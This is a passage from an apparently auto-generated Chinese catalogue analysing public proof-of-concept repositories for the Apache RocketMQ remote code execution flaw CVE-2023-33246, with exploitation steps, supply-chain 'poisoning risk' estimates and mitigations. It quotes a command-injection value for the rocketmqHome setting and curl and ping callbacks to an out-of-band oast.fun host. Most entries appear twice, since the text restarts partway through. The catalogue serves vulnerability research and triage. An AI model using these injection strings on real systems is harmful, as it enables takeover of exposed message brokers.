*   升级到 RocketMQ 4.9.6 或更高版本（如果使用 RocketMQ 4.x）。
*   对暴露在公网的 RocketMQ 组件进行严格的权限控制和访问验证。

**项目地址:** [0xKayala/CVE-2023-33246](https://github.com/0xKayala/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #2

**来源**: [CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md](../2023/CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。由于 RocketMQ 的多个组件（NameServer、Broker 和 Controller）可能暴露在公网上且缺乏适当的权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **更新配置功能：** 攻击者可以利用更新配置功能，通过发送恶意配置来执行任意命令，命令以 RocketMQ 运行用户的身份执行。
2.  **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议内容，达到执行命令的目的。

提供的漏洞利用代码是一个环境搭建的说明文档，引用了其他利用代码仓库。代码本身没有包含直接的漏洞利用payload，但给出了搭建漏洞环境的方法，参考链接包含着漏洞利用代码，因此可以判断该漏洞的POC是有效的。

**投毒风险分析：**

此仓库主要提供了环境搭建和参考链接，本身不包含直接的攻击代码，但间接引导用户使用参考链接中的POC。 如果参考链接的POC被植入恶意代码(例如反弹shell到恶意IP)，则存在投毒风险。由于无法直接评估参考链接的安全性，这里给出一个相对保守的估计，投毒风险的可能性为 10%。 这个风险主要来自于用户下载和使用来自不可信来源的POC。

**漏洞利用方式总结：**

1.  **漏洞定位：** 确定目标系统运行着受影响版本的 Apache RocketMQ，并且相关组件暴露在公网上。
2.  **攻击向量选择：** 选择利用更新配置功能或伪造 RocketMQ 协议内容这两种方式之一。
3.  **构造 Payload：** 构造包含恶意命令的 Payload。例如，如果利用更新配置功能，则需要构造能够执行任意命令的配置信息。如果伪造 RocketMQ 协议，则需要构造符合 RocketMQ 协议格式的恶意数据。
4.  **发送 Payload：** 将构造好的 Payload 发送到目标系统的 RocketMQ 组件。
5.  **执行命令：** 目标系统执行 Payload 中的命令，攻击者从而获得对系统的控制。

搜索引擎结果表明该漏洞已被广泛关注，并存在被利用的风险。CISA 也将此漏洞添加到已知被利用漏洞目录中，表明该漏洞具有较高的实际危害。

**项目地址:** [4mazing/CVE-2023-33246-Copy](https://github.com/4mazing/CVE-2023-33246-Copy)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #3

**来源**: [CVE-2023-33246-AiK1d_CVE-2023-33246.md](../2023/CVE-2023-33246-AiK1d_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可执行任意命令

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ组件暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行 (RCE) 漏洞。该漏洞存在于5.1.0及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 组件暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，权限与 RocketMQ 运行的用户相同。提供的POC代码是一个检测工具，用于扫描目标是否存在漏洞。根据代码内容判断，投毒风险较低,因为只是检测是否存在漏洞。搜索引擎结果显示此漏洞已被广泛利用，并被添加到CISA的已知被利用漏洞目录中。利用方式包括更新配置和伪造协议内容。

**项目地址:** [AiK1d/CVE-2023-33246](https://github.com/AiK1d/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #4

**来源**: [CVE-2023-33246-I5N0rth_CVE-2023-33246.md](../2023/CVE-2023-33246-I5N0rth_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。攻击者可以通过更新RocketMQ的配置，注入恶意命令，从而以运行RocketMQ的用户身份执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的POC代码是有效的。漏洞库信息和搜索引擎结果表明该漏洞已经被广泛关注，并且存在公开的漏洞利用代码。POC代码通过修改`rocketmqHome`属性，注入包含反弹shell的命令。

**投毒风险：**
此仓库中存在作者隐藏的投毒代码的可能性较低，大概为10%。
*   `README.md` 仅包含漏洞说明和截图，没有可疑代码。
*   `pom.xml` 定义了项目依赖，只依赖了`rocketmq-client`，没有引入其他恶意的依赖项。
*   `src/main/java/org/example/Main.java` 是漏洞利用的主要代码，虽然代码本身利用漏洞进行远程代码执行，但没有发现其他额外的恶意行为。
urls数组包含的地址可能存在恶意，但是这些地址可以自行修改，不是仓库本身自带的恶意代码。

**利用方式：**
1.  **目标确认:** 确定目标RocketMQ服务的NameServer地址。
2.  **构造恶意配置：** 利用DefaultMQAdminExt工具，构造包含恶意命令的Properties对象。关键在于修改`rocketmqHome`参数，将其设置为包含命令注入的字符串。POC中使用了`-c $@|sh . echo ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun;`作为示例，攻击者可以替换为任何希望执行的命令。
3.  **更新Broker配置：** 使用`admin.updateBrokerConfig()`方法将恶意配置发送到目标Broker。由于漏洞存在于未授权访问，攻击者可以绕过身份验证直接发送配置。
4.  **命令执行：** Broker在处理更新后的配置时，会执行`rocketmqHome`参数中的恶意命令，实现远程代码执行。

**缓解措施：**
*   升级到RocketMQ 5.1.1或更高版本(5.x分支)，或4.9.6或更高版本(4.x分支)。
*   对RocketMQ组件（NameServer、Broker、Controller）进行严格的权限控制，避免暴露在公网上。

**项目地址:** [I5N0rth/CVE-2023-33246](https://github.com/I5N0rth/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #5

**来源**: [CVE-2023-33246-Le1a_CVE-2023-33246.md](../2023/CVE-2023-33246-Le1a_CVE-2023-33246.md)

## CVE-2023-33246 - Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要目标RocketMQ服务暴露在网络上，且无权限验证或存在可绕过的权限验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以通过以下方式利用该漏洞：

1.  **利用方式:**  通过更新配置功能执行任意命令。RocketMQ的NameServer、Broker和Controller组件如果暴露在公网上且缺乏权限验证，攻击者可以通过更新配置的方式，执行任意系统命令，从而控制服务器。或者通过伪造RocketMQ协议内容也可以达到同样的效果。
2.  **POC有效性:**  提供的POC代码（java -jar CVE-2023-33246.jar -ip \"127.0.0.1:10911\" -cmd \"open -a Calculator\"）尝试利用此漏洞。该POC声称会在35秒延时后执行命令，并自动还原配置，以减少对目标环境的影响。基于漏洞描述，此POC代码应该有效。
3. **投毒风险评估:**

分析漏洞利用代码中的 README.md 文件，可以看到以下几点：

*   **自动化还原配置:** 工具声称在利用漏洞后会自动还原配置，以避免持久性影响。但此操作依赖程序正确运行完成，若中途强制关闭可能无法还原。
*   **延时执行:** 为了确保漏洞被触发，工具设置了35秒的延时，这个延时可以解释为等待心跳机制触发漏洞利用。

**风险评估:**

*   **较高风险:**  该工具可以执行任意命令，因此如果被恶意修改，可以植入后门、窃取数据或进行其他恶意活动。
*   **低度混淆:**  目前的代码没有明显的混淆或隐藏恶意功能的行为。

综上所述，虽然POC代码本身似乎是为了方便利用漏洞而编写，但仍存在一定的投毒风险。恶意攻击者可以修改该POC，在执行命令前后添加恶意代码，例如植入后门或窃取敏感信息。此外，如果工具在执行过程中被中断，自动还原配置的功能可能失效，导致目标系统配置被恶意更改。因此, 判定存在10%的投毒风险。

**项目地址:** [Le1a/CVE-2023-33246](https://github.com/Le1a/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #6

**来源**: [CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md](../2023/CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ NameServer、Broker 或 Controller 组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息和搜索结果，该漏洞是由于 RocketMQ 的某些组件（NameServer、Broker、Controller）暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，获得服务器的控制权限。

**有效性:**
提供的 POC 代码 `CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py` 通过 socket 连接到目标 RocketMQ 服务，构造包含恶意命令的 payload 并发送，从而实现远程代码执行。根据搜索结果，该漏洞已经被积极利用，POC 代码的有效性较高。

**投毒风险:**
查看提供的 POC 代码，该脚本主要功能是构造并发送恶意 payload，执行指定的命令。经过分析，未发现明显的投毒代码，例如下载执行恶意文件或篡改系统配置等操作。因此，认为该仓库中存在作者隐藏的投毒代码的概率较低，约为 0%。

**利用方式:**
1.  **目标确定:** 确定目标 RocketMQ 服务的 IP 地址和端口（默认端口可能为 9876）。
2.  **Payload 构造:** 使用 POC 脚本，指定要执行的命令。POC 脚本会将命令嵌入到特定的 RocketMQ 协议格式中，构造恶意的 payload。
3.  **发送 Payload:** POC 脚本通过 socket 连接到目标 RocketMQ 服务，并将构造的 payload 发送过去。
4.  **命令执行:** 如果目标 RocketMQ 服务存在漏洞且未进行修复，它将解析并执行 payload 中的命令，从而实现远程代码执行。

**项目地址:** [Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT](https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #7

**来源**: [CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md](../2023/CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ Broker组件暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 存在于 Apache RocketMQ 5.1.0 及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 等组件暴露在公网上，且缺乏权限验证，攻击者可以利用 update configuration 功能，或通过伪造 RocketMQ 协议内容，以 RocketMQ 运行的系统用户身份执行任意命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞是一个已知的、被积极利用的远程代码执行漏洞。CISA 已将其添加到已知被利用的漏洞目录中。存在公开可用的PoC利用代码。

**投毒风险：**

PoC代码主要包含版本检测脚本（`RocketMQRceCheck`）和漏洞利用脚本（`RocketMQ_RCE_EXPLOIT`）。

*   版本检测脚本：用于检查目标 RocketMQ 服务的版本，判断是否存在漏洞。
*   漏洞利用脚本：通过发送恶意配置更新请求，或伪造 RocketMQ 协议，来执行任意命令。

README.md 文件中给出的利用方式是直接执行命令，例如 `curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test`。这种利用方式本身不包含明显的投毒代码，但攻击者可以通过替换命令为恶意payload来达到投毒目的，例如下载并执行恶意脚本。另外检测脚本理论上也可以携带恶意payload，但可能性较低，因为check的目的是检查，携带恶意代码容易被发现。

考虑到代码仓库的作者可能会在利用脚本中嵌入后门，或使用隐蔽的方式执行恶意操作，因此存在一定的投毒风险，风险程度大约为10%。

**利用方式：**

1.  **组件暴露：**  攻击者首先需要确定目标 RocketMQ 的相关组件（如 Broker）暴露在公网上。
2.  **版本检测：**  攻击者可以使用 `RocketMQRceCheck` 脚本或其他方法来检测目标 RocketMQ 服务的版本，确认是否存在漏洞。
3.  **RCE利用：**
    *   **更新配置：** 攻击者可以利用 update configuration 功能，发送包含恶意命令的配置更新请求。  该命令将会被目标服务器执行。
    *   **协议伪造：** 攻击者还可以伪造 RocketMQ 协议内容，发送恶意请求到目标服务器，从而执行任意命令。通常命令执行的结果会通过外连的方式传回，例如利用curl命令将结果发送到攻击者控制的服务器上。
4.  **命令执行：**  成功利用漏洞后，攻击者可以以 RocketMQ 运行的系统用户身份执行任意命令，例如安装恶意软件、窃取敏感数据等。

**项目地址:** [MkJos/CVE-2023-33246_RocketMQ_RCE_EXP](https://github.com/MkJos/CVE-2023-33246_RocketMQ_RCE_EXP)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #8

**来源**: [CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md](../2023/CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ组件（NameServer, Broker, Controller）暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是一个Apache RocketMQ中的远程代码执行漏洞。漏洞存在于5.1.0及更早版本中。由于RocketMQ的某些组件在公网暴露且缺乏权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能：** 攻击者可以利用`updateBrokerConfig`方法，通过修改配置参数（例如`rocketmqHome`）来执行任意命令。POC代码中的`Main.java`文件演示了如何通过设置`rocketmqHome`属性来执行shell命令或反弹shell。

2.  **伪造RocketMQ协议内容：** 攻击者可以构造恶意的RocketMQ协议内容，绕过身份验证，从而执行命令。


**漏洞利用方式：**

1.  攻击者首先需要确定目标RocketMQ服务的NameServer地址。
2.  然后，攻击者可以使用POC代码中的`updateConfig`方法，修改Broker的配置，例如`rocketmqHome`，将其设置为包含恶意命令的字符串。
3.  RocketMQ服务在读取并应用新的配置时，会执行攻击者注入的命令。


**投毒风险分析：**

该POC代码的主要目的是演示漏洞的利用和缓解方法。`README.md`文件表明该项目旨在提供CVE-2023-33246的缓解措施，并且`BrokerConfig.java`文件包含了对`RocketmqHome`参数的增强验证。

`Main.java`包含用于攻击测试的代码，虽然用于演示漏洞利用，但不应被认为是投毒代码。

但是，仍然存在一些风险：

*   **潜在的供应链风险：** 依赖项`rocketmq-client`和`rocketmq-tools`可能存在未知的漏洞，虽然概率较低，但存在一定风险。
*   **代码缺陷：** 代码中可能存在未知的bug，可能被攻击者利用。
*   **误用：** 用户可能错误地将此代码部署到生产环境，导致安全风险。

因此，评估投毒风险为10%。大多数代码用于漏洞验证和防御，但依赖项和其他潜在问题始终存在一定风险。


**项目地址:** [PavilionQ/CVE-2023-33246-mitigation](https://github.com/PavilionQ/CVE-2023-33246-mitigation)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #9

**来源**: [CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md](../2023/CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md)

# CVE-2023-33246

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-33246-0xKayala_CVE-2023-33246.md](../2023/CVE-2023-33246-0xKayala_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和 Controller 组件暴露在公网，且缺少权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息，如果 RocketMQ 的某些组件（如 NameServer、Broker 和 Controller）暴露在公网上，并且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，从而完全控制服务器。

**有效性：**

根据CISA KEV收录信息, 此漏洞在野外被积极利用，证明其有效性。
提供的漏洞利用代码 `check.py` 是一个版本检测脚本，它通过连接目标端口并发送特定请求来判断 RocketMQ 的版本。虽然这个脚本本身并不能直接执行远程命令，但它可以用来确认目标是否为易受攻击的版本。

**投毒风险：**

查看 `check.py` 代码，主要是进行版本检测，虽然代码量比较大，但是没有发现明显的恶意代码或后门。代码中包含了大量 RocketMQ 的版本字符串，用于进行版本比对。 线程池用于并发扫描IP，网络请求部分使用了标准库，没有发现可疑的操作。因此，投毒风险较低，估计在 10% 左右。

**利用方式：**

1.  **版本检测：** 使用 `check.py` 脚本或其他方法检测目标 RocketMQ 实例的版本是否在受影响范围内（<= 5.1.0）。
2.  **漏洞利用：** 如果目标版本易受攻击，攻击者可以利用以下两种方式执行远程命令：
    *   **更新配置功能：** 攻击者可以利用未授权的访问权限，通过更新 RocketMQ 的配置来插入恶意命令。
    *   **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议数据包，发送给目标服务器，从而触发远程命令执行。

**修复建议：**

*   升级到 RocketMQ 5.1.1 或更高版本（如果使用 RocketMQ 5.x）。
*   升级到 RocketMQ 4.9.6 或更高版本（如果使用 RocketMQ 4.x）。
*   对暴露在公网的 RocketMQ 组件进行严格的权限控制和访问验证。

**项目地址:** [0xKayala/CVE-2023-33246](https://github.com/0xKayala/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #2

**来源**: [CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md](../2023/CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。由于 RocketMQ 的多个组件（NameServer、Broker 和 Controller）可能暴露在公网上且缺乏适当的权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **更新配置功能：** 攻击者可以利用更新配置功能，通过发送恶意配置来执行任意命令，命令以 RocketMQ 运行用户的身份执行。
2.  **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议内容，达到执行命令的目的。

提供的漏洞利用代码是一个环境搭建的说明文档，引用了其他利用代码仓库。代码本身没有包含直接的漏洞利用payload，但给出了搭建漏洞环境的方法，参考链接包含着漏洞利用代码，因此可以判断该漏洞的POC是有效的。

**投毒风险分析：**

此仓库主要提供了环境搭建和参考链接，本身不包含直接的攻击代码，但间接引导用户使用参考链接中的POC。 如果参考链接的POC被植入恶意代码(例如反弹shell到恶意IP)，则存在投毒风险。由于无法直接评估参考链接的安全性，这里给出一个相对保守的估计，投毒风险的可能性为 10%。 这个风险主要来自于用户下载和使用来自不可信来源的POC。

**漏洞利用方式总结：**

1.  **漏洞定位：** 确定目标系统运行着受影响版本的 Apache RocketMQ，并且相关组件暴露在公网上。
2.  **攻击向量选择：** 选择利用更新配置功能或伪造 RocketMQ 协议内容这两种方式之一。
3.  **构造 Payload：** 构造包含恶意命令的 Payload。例如，如果利用更新配置功能，则需要构造能够执行任意命令的配置信息。如果伪造 RocketMQ 协议，则需要构造符合 RocketMQ 协议格式的恶意数据。
4.  **发送 Payload：** 将构造好的 Payload 发送到目标系统的 RocketMQ 组件。
5.  **执行命令：** 目标系统执行 Payload 中的命令，攻击者从而获得对系统的控制。

搜索引擎结果表明该漏洞已被广泛关注，并存在被利用的风险。CISA 也将此漏洞添加到已知被利用漏洞目录中，表明该漏洞具有较高的实际危害。

**项目地址:** [4mazing/CVE-2023-33246-Copy](https://github.com/4mazing/CVE-2023-33246-Copy)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #3

**来源**: [CVE-2023-33246-AiK1d_CVE-2023-33246.md](../2023/CVE-2023-33246-AiK1d_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可执行任意命令

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ组件暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行 (RCE) 漏洞。该漏洞存在于5.1.0及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 组件暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，权限与 RocketMQ 运行的用户相同。提供的POC代码是一个检测工具，用于扫描目标是否存在漏洞。根据代码内容判断，投毒风险较低,因为只是检测是否存在漏洞。搜索引擎结果显示此漏洞已被广泛利用，并被添加到CISA的已知被利用漏洞目录中。利用方式包括更新配置和伪造协议内容。

**项目地址:** [AiK1d/CVE-2023-33246](https://github.com/AiK1d/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #4

**来源**: [CVE-2023-33246-I5N0rth_CVE-2023-33246.md](../2023/CVE-2023-33246-I5N0rth_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。攻击者可以通过更新RocketMQ的配置，注入恶意命令，从而以运行RocketMQ的用户身份执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的POC代码是有效的。漏洞库信息和搜索引擎结果表明该漏洞已经被广泛关注，并且存在公开的漏洞利用代码。POC代码通过修改`rocketmqHome`属性，注入包含反弹shell的命令。

**投毒风险：**
此仓库中存在作者隐藏的投毒代码的可能性较低，大概为10%。
*   `README.md` 仅包含漏洞说明和截图，没有可疑代码。
*   `pom.xml` 定义了项目依赖，只依赖了`rocketmq-client`，没有引入其他恶意的依赖项。
*   `src/main/java/org/example/Main.java` 是漏洞利用的主要代码，虽然代码本身利用漏洞进行远程代码执行，但没有发现其他额外的恶意行为。
urls数组包含的地址可能存在恶意，但是这些地址可以自行修改，不是仓库本身自带的恶意代码。

**利用方式：**
1.  **目标确认:** 确定目标RocketMQ服务的NameServer地址。
2.  **构造恶意配置：** 利用DefaultMQAdminExt工具，构造包含恶意命令的Properties对象。关键在于修改`rocketmqHome`参数，将其设置为包含命令注入的字符串。POC中使用了`-c $@|sh . echo ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun;`作为示例，攻击者可以替换为任何希望执行的命令。
3.  **更新Broker配置：** 使用`admin.updateBrokerConfig()`方法将恶意配置发送到目标Broker。由于漏洞存在于未授权访问，攻击者可以绕过身份验证直接发送配置。
4.  **命令执行：** Broker在处理更新后的配置时，会执行`rocketmqHome`参数中的恶意命令，实现远程代码执行。

**缓解措施：**
*   升级到RocketMQ 5.1.1或更高版本(5.x分支)，或4.9.6或更高版本(4.x分支)。
*   对RocketMQ组件（NameServer、Broker、Controller）进行严格的权限控制，避免暴露在公网上。

**项目地址:** [I5N0rth/CVE-2023-33246](https://github.com/I5N0rth/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #5

**来源**: [CVE-2023-33246-Le1a_CVE-2023-33246.md](../2023/CVE-2023-33246-Le1a_CVE-2023-33246.md)

## CVE-2023-33246 - Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要目标RocketMQ服务暴露在网络上，且无权限验证或存在可绕过的权限验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以通过以下方式利用该漏洞：

1.  **利用方式:**  通过更新配置功能执行任意命令。RocketMQ的NameServer、Broker和Controller组件如果暴露在公网上且缺乏权限验证，攻击者可以通过更新配置的方式，执行任意系统命令，从而控制服务器。或者通过伪造RocketMQ协议内容也可以达到同样的效果。
2.  **POC有效性:**  提供的POC代码（java -jar CVE-2023-33246.jar -ip \"127.0.0.1:10911\" -cmd \"open -a Calculator\"）尝试利用此漏洞。该POC声称会在35秒延时后执行命令，并自动还原配置，以减少对目标环境的影响。基于漏洞描述，此POC代码应该有效。
3. **投毒风险评估:**

分析漏洞利用代码中的 README.md 文件，可以看到以下几点：

*   **自动化还原配置:** 工具声称在利用漏洞后会自动还原配置，以避免持久性影响。但此操作依赖程序正确运行完成，若中途强制关闭可能无法还原。
*   **延时执行:** 为了确保漏洞被触发，工具设置了35秒的延时，这个延时可以解释为等待心跳机制触发漏洞利用。

**风险评估:**

*   **较高风险:**  该工具可以执行任意命令，因此如果被恶意修改，可以植入后门、窃取数据或进行其他恶意活动。
*   **低度混淆:**  目前的代码没有明显的混淆或隐藏恶意功能的行为。

综上所述，虽然POC代码本身似乎是为了方便利用漏洞而编写，但仍存在一定的投毒风险。恶意攻击者可以修改该POC，在执行命令前后添加恶意代码，例如植入后门或窃取敏感信息。此外，如果工具在执行过程中被中断，自动还原配置的功能可能失效，导致目标系统配置被恶意更改。因此, 判定存在10%的投毒风险。

**项目地址:** [Le1a/CVE-2023-33246](https://github.com/Le1a/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #6

**来源**: [CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md](../2023/CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ NameServer、Broker 或 Controller 组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息和搜索结果，该漏洞是由于 RocketMQ 的某些组件（NameServer、Broker、Controller）暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，获得服务器的控制权限。

**有效性:**
提供的 POC 代码 `CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py` 通过 socket 连接到目标 RocketMQ 服务，构造包含恶意命令的 payload 并发送，从而实现远程代码执行。根据搜索结果，该漏洞已经被积极利用，POC 代码的有效性较高。

**投毒风险:**
查看提供的 POC 代码，该脚本主要功能是构造并发送恶意 payload，执行指定的命令。经过分析，未发现明显的投毒代码，例如下载执行恶意文件或篡改系统配置等操作。因此，认为该仓库中存在作者隐藏的投毒代码的概率较低，约为 0%。

**利用方式:**
1.  **目标确定:** 确定目标 RocketMQ 服务的 IP 地址和端口（默认端口可能为 9876）。
2.  **Payload 构造:** 使用 POC 脚本，指定要执行的命令。POC 脚本会将命令嵌入到特定的 RocketMQ 协议格式中，构造恶意的 payload。
3.  **发送 Payload:** POC 脚本通过 socket 连接到目标 RocketMQ 服务，并将构造的 payload 发送过去。
4.  **命令执行:** 如果目标 RocketMQ 服务存在漏洞且未进行修复，它将解析并执行 payload 中的命令，从而实现远程代码执行。

